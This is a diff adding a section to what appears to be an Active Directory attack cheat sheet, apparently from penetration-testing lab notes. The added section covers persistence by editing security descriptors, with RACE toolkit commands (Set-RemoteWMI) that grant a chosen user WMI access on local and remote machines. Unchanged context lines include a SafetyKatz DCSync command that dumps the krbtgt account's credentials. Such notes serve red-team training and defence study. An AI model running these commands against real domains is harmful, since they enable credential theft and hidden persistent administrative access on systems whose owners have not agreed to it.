@@ -17,6 +17,7 @@
   * [DSRM](#persistence-using-dsrm)
   * [ACLs AdminSDHolder](#persistence-using-acls-adminsdholder)
   * [ACLs Rights Abuse](#persistence-using-acls-rights-abuse)
+  * [ACLs Security Descriptors](#persistence-using-security-descriptors)
 
 ## General
 Connect to a machine with Administrator privileges
@@ -933,6 +934,41 @@ Then execute DCSync
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
+## Persistence using ACLs Security Descriptors
+It is possible to modify security descriptors of multiple remote access methods to allow access to non-domain users. In order to perform this techniques administrative privileges are required.
+
+Security Descriptor Definition Language (SSDL) defines the format which is used to describe a security descriptor. SSDL uses ACE strings for DACL and SACL:
+
+ace_type; ace_flags; rights; object_guid; inherit_object_guid; account_sid (without spaces here reported for readability)
+
+For example the ACE for built-in administrators for WMI namespaces is: A;CI;CCDLLCSWRPWPRCWD;;;SID
+
+ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
+
+Load RACE to powershell:
+```
+. C:\AD\Tools\RACE-master\RACE.ps1
+```
+
+Set WMI permission for a user on local machine:
+```
+Set-RemoteWMI -SamAccountName <username> -Verbose
+```
+
+Set WMI permission for a user on remote machine without explicit credentials
+```
+Set-RemoteWMI -SamAccountName <username> -ComputerName <machine_name> -namespace 'root\cimv2' -Verbose
+```
+
+Set WMI permission for a user on remote machine with explicit credentials
+```
+Set-RemoteWMI -SamAccountName <username> -ComputerName <machine_name> -Credential Administrator -namespace 'root\cimv2' -Verbose
+```
+
+Remove WMI permission from remote machine
+```
+Set-RemoteWMI -SamAccountName <username> -ComputerName <machine_name> -namespace 'root\cimv2' -Remove -Verbose
+```
 
 
 
